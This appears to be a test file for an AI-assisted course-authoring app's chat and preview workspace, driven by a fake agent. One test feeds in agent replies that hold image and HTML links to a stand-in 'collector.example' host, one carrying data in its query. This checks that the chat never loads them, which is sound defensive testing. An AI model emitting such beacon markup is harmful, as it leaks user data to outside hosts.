import { act, fireEvent, screen, waitFor, within } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import type { AgentStartResult, AgentStatus } from '../src/desktop/bridge';
import { createSessionStore } from '../src/studio/session/store';
import type { TranscriptEntry } from '../src/studio/session/transcript';
import { axeViolations } from './axe';
import { lesson, makeCourse } from './fake-data';
import {
  DESKTOP_INFO,
  fakeAgent,
  fakeDesktop,
  installDesktop,
  uninstallDesktop,
} from './fake-desktop';
import { draftDoc, fakeStudio } from './fake-studio';
import { openApp } from './harness';
import { choose } from './select';

vi.mock('../src/log', () => ({
  log: { warn: vi.fn(), error: vi.fn(), info: vi.fn(), debug: vi.fn() },
}));

const GIT = makeCourse({ id: 'git', title: 'Git', educatorIds: ['u1'] });
const studio = () => fakeStudio({ courses: [{ live: GIT, draft: draftDoc(GIT, { rev: 3 }) }] });

afterEach(() => {
  uninstallDesktop();
  vi.unstubAllGlobals();
  vi.clearAllMocks();
});

/**
 * A session on Git, already on this computer, in the desktop app with a fake agent. The test plays
 * the agent through `emit` and `call`.
 */
let sessions = 0;

async function open(
  init: {
    status?: AgentStatus;
    start?: AgentStartResult;
    kind?: 'new' | 'edit';
    /** Changes the fake agent before the page asks it anything. */
    prepare?: (agent: ReturnType<typeof fakeAgent>['agent']) => void;
    /** The chat already on this computer. */
    transcript?: TranscriptEntry[];
    /** The draft the session starts from; Git by default. */
    course?: typeof GIT;
    path?: (id: string) => string;
    info?: () => Promise<typeof DESKTOP_INFO>;
  } = {},
) {
  // A new id each time: a runtime still writing a turn outlives its test (`acquireAgentSession`).
  sessions += 1;
  const id = `s${sessions}`;
  const fake = fakeDesktop(init.info ? { info: init.info } : {});
  const store = createSessionStore({ desktop: fake.desktop, uid: 'u1', newId: () => id });
  await store.start(
    init.kind === 'new'
      ? { kind: 'new', goal: 'A course on code review.' }
      : { kind: 'edit', courseId: 'git', goal: 'Simplify the basics.' },
    async () => draftDoc(init.course ?? GIT, { rev: 3 }),
  );
  if (init.transcript) await store.writeTranscript(id, init.transcript);
  const agent = fakeAgent(fake.desktop, {
    ...(init.status ? { status: init.status } : {}),
    ...(init.start ? { start: init.start } : {}),
  });
  init.prepare?.(agent.agent);
  installDesktop(fake.desktop);
  const app = await openApp(init.path?.(id) ?? `/studio/sessions/${id}`, {
    roles: ['educator'],
    studio: studio(),
  });
  return {
    ...fake,
    ...agent,
    store,
    app,
    id,
    emit: (event: Record<string, unknown>) =>
      agent.emit({ ...event, sessionId: id } as Parameters<typeof agent.emit>[0]),
    call: (name: string, input: unknown) => agent.call(name, input, id),
  };
}

const box = () => screen.getByRole('textbox', { name: 'Ask for a change' }) as HTMLTextAreaElement;

/** Sends the box's text and waits for the turn to start. */
async function send(s: Awaited<ReturnType<typeof open>>, text?: string) {
  if (text !== undefined) fireEvent.change(box(), { target: { value: text } });
  fireEvent.click(screen.getByRole('button', { name: 'Send' }));
  await waitFor(() => expect(s.agent.send).toHaveBeenCalled());
}

/** Ends the running turn as the agent would, and waits for it to be written. */
async function endTurn(s: Awaited<ReturnType<typeof open>>, outcome: 'done' | 'stopped' = 'done') {
  act(() => s.emit({ type: 'turn_end', agentSessionId: 'claude-1', outcome }));
  await screen.findByRole('link', { name: /^Turn \d/ });
}

describe('the session workspace', () => {
  it('shows the header, the chat and the preview of the working copy', async () => {
    const s = await open();
    expect(
      await screen.findByRole('heading', { level: 1, name: 'Simplify the basics.' }),
    ).toBeTruthy();
    expect(screen.getByText('0 changes · checks pass')).toBeTruthy();
    expect(screen.getByRole('link', { name: 'Review' }).getAttribute('href')).toBe(
      `/studio/sessions/${s.id}/review`,
    );
    expect(screen.getByRole('link', { name: 'Studio courses' }).getAttribute('href')).toBe(
      '/studio',
    );
    expect(screen.getByRole('log', { name: 'Chat with the agent' })).toBeTruthy();
    // Nothing changed yet: the preview opens on the first item, drawn by the player.
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l1' })).toBeTruthy();
    expect(screen.getByText('Body of l1')).toBeTruthy();
    expect(screen.queryByRole('group', { name: /: / })).toBeNull();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    expect(s.agent.start).toHaveBeenCalledTimes(1);
    expect(await axeViolations(document.body)).toEqual([]);
    // An unchanged question carries no mark.
    choose(screen.getByRole('combobox', { name: 'Lesson or Quiz' }), '2.2 · Quiz I');
    expect(screen.getByRole('heading', { level: 2, name: 'Quiz I' })).toBeTruthy();
    expect(screen.getByRole('radio', { name: /A/ })).toBeTruthy();
    expect(screen.queryByRole('group', { name: /: Question/ })).toBeNull();
  });

  it('opens again with its chat, and an empty message box', async () => {
    await open({
      transcript: [
        { kind: 'educator', turnId: 't1', at: '2026-11-19T10:00:00.000Z', text: 'Earlier\nwords.' },
        { kind: 'agent', turnId: 't1', at: '2026-11-19T10:00:01.000Z', text: 'Earlier reply.' },
      ],
    });
    expect(await screen.findByText('Earlier reply.')).toBeTruthy();
    expect(screen.queryByText(/Your goal is in the box below/)).toBeNull();
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy());
    expect(box().value).toBe('');
  });

  it('runs a turn: activity in words, Stop, the reply, marks in the preview, and the turn line', async () => {
    const s = await open();
    await screen.findByText('0 changes · checks pass');
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy());
    await send(s);
    expect(s.agent.send).toHaveBeenCalledWith(s.id, 'Simplify the basics.');
    expect(box().value).toBe('');
    const status = screen
      .getAllByRole('status')
      .find((el) => el.className.includes('g-chat-activity'));
    expect(status?.textContent).toBe('Thinking');
    expect(screen.getByRole('button', { name: 'Stop' })).toBeTruthy();
    expect(screen.queryByRole('button', { name: 'Send' })).toBeNull();

    const answer = await act(() =>
      s.call('add_block', { lessonId: 'l1', block: { type: 'markdown', md: 'A shorter start.' } }),
    );
    expect(answer).toEqual({ text: expect.stringContaining('Added markdown block') });
    // The plain-words line, never the tool's name.
    act(() => s.emit({ type: 'tool_call', callId: 'c', name: 'add_block' }));
    expect(screen.getByText('Writing a lesson')).toBeTruthy();
    expect(screen.queryByText(/add_block/)).toBeNull();
    act(() => s.emit({ type: 'text', text: 'I added **one** block.' }));
    expect(screen.getByText('one').tagName).toBe('STRONG');

    const mark = screen.getByRole('group', { name: 'added: Text block' });
    expect(within(mark).getByText('A shorter start.')).toBeTruthy();
    expect(screen.getByText('1 change · checks pass')).toBeTruthy();

    await endTurn(s);
    const line = screen.getByRole('link', { name: 'Turn 1 · 1 change' });
    expect(line.getAttribute('href')).toMatch(
      new RegExp(`^/studio/sessions/${s.id}/review\\?turn=`),
    );
    expect(screen.getByRole('button', { name: 'Undo turn 1' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy();
    expect(await axeViolations(document.body)).toEqual([]);
  });

  it('never draws a picture the agent writes in the chat, so no address is fetched', async () => {
    const s = await open();
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy());
    await send(s);
    act(() =>
      s.emit({
        type: 'text',
        text: [
          'Done. ![the lesson](https://collector.example/p.png?d=Rebase%20first)',
          '![][ref] <img src="https://collector.example/raw.png">',
          '',
          '<picture><source srcset="https://collector.example/set.png"></picture>',
          '',
          '[ref]: https://collector.example/ref.png',
        ].join('\n'),
      }),
    );
    const chat = screen.getByRole('log', { name: 'Chat with the agent' });
    await within(chat).findByText(/Done\./);
    expect(chat.querySelector('img')).toBeNull();
    expect(document.querySelector('img[src*="collector.example"]')).toBeNull();
    // Raw HTML is never markup: it stays words, so nothing in the chat carries an address.
    expect(chat.querySelector('[src], [srcset], picture, source, video, audio, iframe')).toBeNull();
    // The picture's words stay, as words.
    expect(within(chat).getByText('the lesson')).toBeTruthy();
  });

  it('undoes the newest turn only after a confirmation', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    await act(() =>
      s.call('add_block', { lessonId: 'l1', block: { type: 'markdown', md: 'Extra.' } }),
    );
    await endTurn(s);
    fireEvent.click(screen.getByRole('button', { name: 'Undo turn 1' }));
    const dialog = screen.getByRole('dialog', { name: 'Undo turn 1?' });
    fireEvent.click(within(dialog).getByRole('button', { name: 'Cancel' }));
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(screen.getByText('1 change · checks pass')).toBeTruthy();

    fireEvent.click(screen.getByRole('button', { name: 'Undo turn 1' }));
    fireEvent.click(
      within(screen.getByRole('dialog')).getByRole('button', { name: 'Undo turn 1' }),
    );
    expect(
      await screen.findByText('Turn undone: the course is back as it was before it.'),
    ).toBeTruthy();
    expect(screen.getByText('0 changes · checks pass')).toBeTruthy();
    expect(screen.queryByRole('link', { name: /^Turn 1/ })).toBeNull();
  });

  it('stops a turn, and gives the box back its focus when the turn ends', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    // The next message can be written meanwhile, but not sent.
    fireEvent.change(box(), { target: { value: 'And then?' } });
    fireEvent.keyDown(box(), { key: 'Enter' });
    expect(s.agent.send).toHaveBeenCalledTimes(1);
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
    await waitFor(() => expect(s.agent.stop).toHaveBeenCalledWith(s.id));
    (document.activeElement as HTMLElement | null)?.blur();
    await endTurn(s, 'stopped');
    expect(screen.getByText('Stopped. What this turn had changed is kept.')).toBeTruthy();
    expect(screen.getByRole('link', { name: 'Turn 1 · no changes' })).toBeTruthy();
    await waitFor(() => expect(document.activeElement).toBe(box()));
  });

  it('sends with Enter, keeps a new line with Shift and Enter, and never sends a blank', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    fireEvent.change(box(), { target: { value: '   ' } });
    fireEvent.keyDown(box(), { key: 'Enter' });
    fireEvent.keyDown(box(), { key: 'a' });
    fireEvent.change(box(), { target: { value: 'Shorter, please.' } });
    fireEvent.keyDown(box(), { key: 'Enter', shiftKey: true });
    expect(s.agent.send).not.toHaveBeenCalled();
    fireEvent.keyDown(box(), { key: 'Enter' });
    await waitFor(() => expect(s.agent.send).toHaveBeenCalledWith(s.id, 'Shorter, please.'));
    expect(screen.getByText('Shorter, please.')).toBeTruthy();
  });

  it('keeps the message when the app refuses it', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    s.agent.send.mockRejectedValueOnce(new Error('gone'));
    await send(s);
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    expect(screen.getByText('Not sent.')).toBeTruthy();
    expect(screen.getByText('The app did not answer')).toBeTruthy();
  });

  it('marks changed questions in a Quiz and moves through the items', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    expect(
      await act(() =>
        s.call('update_question', {
          quizId: 'q1',
          questionId: 'k1',
          prompt: 'Which one?',
          correct: [0],
        }),
      ),
    ).toEqual({ text: expect.any(String) });
    await act(() => s.call('remove_block', { lessonId: 'l3', blockId: 'l3-b' }));
    await act(() => s.call('set_landing', { description: 'Learn Git, simply.' }));
    // Until one is picked, the preview shows the first item that changed: a removed block keeps
    // its mark where it was.
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l3' })).toBeTruthy();
    expect(screen.getByRole('group', { name: 'removed: Text block' })).toBeTruthy();
    expect(screen.queryByText('This lesson is empty.')).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'Previous' }));
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l2' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Previous' }));
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l1' })).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Previous' }) as HTMLButtonElement).disabled).toBe(
      true,
    );
    choose(screen.getByRole('combobox', { name: 'Lesson or Quiz' }), '2.2 · Quiz I (changed)');
    expect(screen.getByRole('heading', { level: 2, name: 'Quiz I' })).toBeTruthy();
    expect(screen.getByRole('group', { name: 'changed: Question' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Next' }));
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l4' })).toBeTruthy();
    expect((screen.getByRole('button', { name: 'Next' }) as HTMLButtonElement).disabled).toBe(true);
    fireEvent.click(screen.getByRole('tab', { name: 'Outline' }));
    const outline = screen.getByRole('tabpanel', { name: 'Outline' });
    expect(within(outline).getByText('Landing page').parentElement?.textContent).toBe(
      'Landing pageChanged',
    );
    expect(within(outline).queryByText('Course details')).toBeNull();
  });

  it('says so when a lesson has nothing in it', async () => {
    await open({
      course: makeCourse({
        id: 'git',
        title: 'Git',
        educatorIds: ['u1'],
        chapters: [{ id: 'p1', title: 'Basics', items: [lesson('l1', { blocks: [] })] }],
      }),
    });
    expect(await screen.findByText('This lesson is empty.')).toBeTruthy();
  });

  it('shows the outline with badges, and opens an item in the preview', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    await act(() => s.call('update_chapter', { chapterId: 'p1', title: 'The basics' }));
    await act(() => s.call('remove_item', { itemId: 'l2' }));
    await act(() => s.call('set_course_details', { title: 'Git, simply' }));
    await act(() => s.call('remove_chapter', { chapterId: 'p2' }));
    fireEvent.click(screen.getByRole('tab', { name: 'Outline' }));
    const outline = screen.getByRole('tabpanel', { name: 'Outline' });
    expect(
      within(outline).getByText('7 changes against the draft this session started from.'),
    ).toBeTruthy();
    // A removed chapter stays where it was, with what was in it.
    expect(within(outline).getByRole('heading', { name: /^History/ }).textContent).toBe(
      'HistoryRemoved',
    );
    expect(within(outline).getByText('Quiz I').parentElement?.textContent).toBe('Quiz IRemoved');
    expect(within(outline).getByRole('heading', { name: /^1 · The basics/ }).textContent).toBe(
      '1 · The basicsRenamed',
    );
    expect(within(outline).getByText('Course details').parentElement?.textContent).toBe(
      'Course detailsChanged',
    );
    expect(within(outline).getByText('Lesson l2').parentElement?.textContent).toBe(
      'Lesson l2Removed',
    );
    expect(within(outline).queryByText('Landing page')).toBeNull();
    fireEvent.click(within(outline).getByRole('button', { name: 'Preview 1.1 · Lesson l1' }));
    expect(screen.getByRole('tab', { name: 'Preview', selected: true })).toBeTruthy();
    expect(screen.getByRole('heading', { level: 2, name: 'Lesson l1' })).toBeTruthy();
    expect(await axeViolations(document.body)).toEqual([]);
  });

  it('opens a new course with nothing to preview yet', async () => {
    await open({ kind: 'new' });
    expect(await screen.findByRole('heading', { name: 'Nothing to preview yet' })).toBeTruthy();
    fireEvent.click(screen.getByRole('tab', { name: 'Outline' }));
    expect(screen.getByText('A new course: everything in it is added.')).toBeTruthy();
    expect(screen.getByText('No chapters yet.')).toBeTruthy();
    expect(screen.getByText(/changes · checks pass$/)).toBeTruthy();
  });

  it('says when a check that stops a save fails', async () => {
    // A draft already past the size limit (Studio saves drafts unfinished).
    const big = makeCourse({
      id: 'git',
      title: 'Git',
      educatorIds: ['u1'],
      chapters: [
        {
          id: 'p1',
          title: 'Basics',
          items: [
            lesson('l1', {
              blocks: Array.from({ length: 60 }, (_, i) => ({
                type: 'markdown',
                id: `b${i}`,
                md: 'x'.repeat(20_000),
              })),
            }),
          ],
        },
      ],
    });
    await open({ course: big });
    expect(await screen.findByText('0 changes · 1 check fails')).toBeTruthy();
  });
});

describe('the session workspace when the agent cannot run', () => {
  it.each<[string, Parameters<typeof open>[0], string, string]>([
    [
      'not installed',
      { status: { state: 'not_installed' } },
      'Claude Code is not on this computer',
      'Check again',
    ],
    [
      'too old',
      { status: { state: 'too_old', version: '2.0.0', minimumVersion: '2.1.328' } },
      'Claude Code needs an update',
      'Check again',
    ],
    [
      'not signed in',
      { start: { ok: false, error: { code: 'not_signed_in' } } },
      'Sign in to Claude Code',
      'Check again',
    ],
    [
      'crashed',
      { start: { ok: false, error: { code: 'crashed', exitCode: 1 } } },
      'The agent stopped',
      'Start it again',
    ],
  ])('%s: a card with the next step in words, and Retry', async (_name, init, title, retry) => {
    const s = await open(init);
    expect(await screen.findByRole('heading', { name: title })).toBeTruthy();
    expect(screen.queryByRole('textbox', { name: 'Ask for a change' })).toBeNull();
    expect(await axeViolations(document.body)).toEqual([]);
    s.agent.status.mockResolvedValue({ state: 'ready', version: '2.1.328' });
    s.agent.start.mockResolvedValue({ ok: true, agentSessionId: 'x' });
    fireEvent.click(screen.getByRole('button', { name: retry }));
    expect(await screen.findByRole('textbox', { name: 'Ask for a change' })).toBeTruthy();
  });

  it('shows a command in the sentence as code', async () => {
    await open({ status: { state: 'not_signed_in', version: '2.1.328' } });
    expect((await screen.findByText('claude')).tagName).toBe('CODE');
  });

  it('asks for the app’s update when the shell lacks a call the session makes', async () => {
    const s = await open({
      prepare: (agent) =>
        agent.status.mockRejectedValue(
          new Error('Error invoking remote method: Error: Not available in this version'),
        ),
    });
    expect(await screen.findByRole('heading', { name: 'Update the app' })).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy();
    vi.mocked(s.desktop.app.checkForUpdate).mockResolvedValueOnce({ state: 'none' } as never);
    fireEvent.click(screen.getByRole('button', { name: 'Update the app' }));
    await waitFor(() => expect(s.desktop.app.checkForUpdate).toHaveBeenCalled());
  });

  it('waits out a plan limit with a note, and a refused Stop with another', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    act(() => s.emit({ type: 'error', error: { code: 'plan_limit', resetsAt: null } }));
    expect(await screen.findByText('Your Claude plan’s limit is reached')).toBeTruthy();
    s.agent.stop.mockRejectedValueOnce(
      new Error('Error invoking remote method: Error: Not available in this version'),
    );
    fireEvent.click(screen.getByRole('button', { name: 'Stop' }));
    expect(await screen.findByRole('button', { name: 'Update the app' })).toBeTruthy();
    expect(screen.getAllByText('Update the app')).toHaveLength(2);
  });

  it('offers Undo on a turn that could not be written', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    await act(() =>
      s.call('add_block', { lessonId: 'l1', block: { type: 'markdown', md: 'Extra.' } }),
    );
    s.desktop.store.write.mockRejectedValueOnce(new Error('store.write failed (ENOSPC)'));
    await endTurn(s);
    expect(screen.getByText('The last turn is not saved')).toBeTruthy();
    expect(screen.getByRole('link', { name: 'Turn 1 · 1 change · not saved' })).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Undo turn 1' }));
    fireEvent.click(
      within(screen.getByRole('dialog')).getByRole('button', { name: 'Undo turn 1' }),
    );
    expect(await screen.findByText('0 changes · checks pass')).toBeTruthy();
  });

  it('says when the copy before a turn is gone', async () => {
    const s = await open();
    await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
    await send(s);
    await endTurn(s);
    s.files.delete(`u1/${s.id}/checkpoints/start.json`);
    fireEvent.click(screen.getByRole('button', { name: 'Undo turn 1' }));
    fireEvent.click(
      within(screen.getByRole('dialog')).getByRole('button', { name: 'Undo turn 1' }),
    );
    expect(await screen.findByText('That turn cannot be undone')).toBeTruthy();
  });
});

describe('the session workspace below 1024px', () => {
  it('puts the chat in a drawer over the preview, keeping the message', async () => {
    // Wide enough for Studio (40rem), not for the two panes (64rem).
    vi.stubGlobal(
      'matchMedia',
      vi.fn((query: string) => ({
        matches: !query.includes('64rem'),
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
      })),
    );
    const s = await open();
    expect(await screen.findByRole('heading', { level: 2, name: 'Lesson l1' })).toBeTruthy();
    expect(screen.queryByRole('log')).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'Chat' }));
    const drawer = screen.getByRole('dialog', { name: 'Chat' });
    await waitFor(() =>
      expect(
        (within(drawer).getByRole('textbox', { name: 'Ask for a change' }) as HTMLTextAreaElement)
          .value,
      ).toBe('Simplify the basics.'),
    );
    fireEvent.click(within(drawer).getByRole('button', { name: 'Send' }));
    await waitFor(() => expect(s.agent.send).toHaveBeenCalled());
    fireEvent.click(within(drawer).getByRole('button', { name: 'Close' }));
    expect(screen.queryByRole('dialog')).toBeNull();
    // With the drawer shut, the page still says what the agent is doing.
    act(() => s.emit({ type: 'activity', text: 'Checking the Quiz' }));
    expect(screen.getByText('Checking the Quiz')).toBeTruthy();
    expect(await axeViolations(document.body)).toEqual([]);
  });
});

describe('the session Review tab', () => {
  it('says Review comes next, inside the session, and keeps the same agent', async () => {
    const s = await open({ path: (id) => `/studio/sessions/${id}/review` });
    expect(await screen.findByRole('heading', { name: 'Review comes next' })).toBeTruthy();
    expect(screen.getByRole('heading', { level: 1, name: 'Simplify the basics.' })).toBeTruthy();
    expect(await axeViolations(document.body)).toEqual([]);
    await waitFor(() => expect(s.agent.start).toHaveBeenCalledTimes(1));
    fireEvent.click(screen.getByRole('link', { name: 'Back to the chat' }));
    expect(await screen.findByRole('log', { name: 'Chat with the agent' })).toBeTruthy();
    fireEvent.click(screen.getByRole('link', { name: 'Review' }));
    expect(await screen.findByRole('heading', { name: 'Review comes next' })).toBeTruthy();
    expect(s.agent.start).toHaveBeenCalledTimes(1);
  });
});

describe('the session page in an app too old for sessions', () => {
  it('offers Update the app', async () => {
    const s = await open({ info: async () => ({ ...DESKTOP_INFO, bridgeVersion: 0 }) });
    expect(await screen.findByText('Update Gurukul Studio')).toBeTruthy();
    vi.mocked(s.desktop.app.checkForUpdate).mockResolvedValueOnce({ state: 'none' } as never);
    fireEvent.click(screen.getByRole('button', { name: 'Update the app' }));
    await waitFor(() => expect(s.desktop.app.checkForUpdate).toHaveBeenCalled());
  });
});
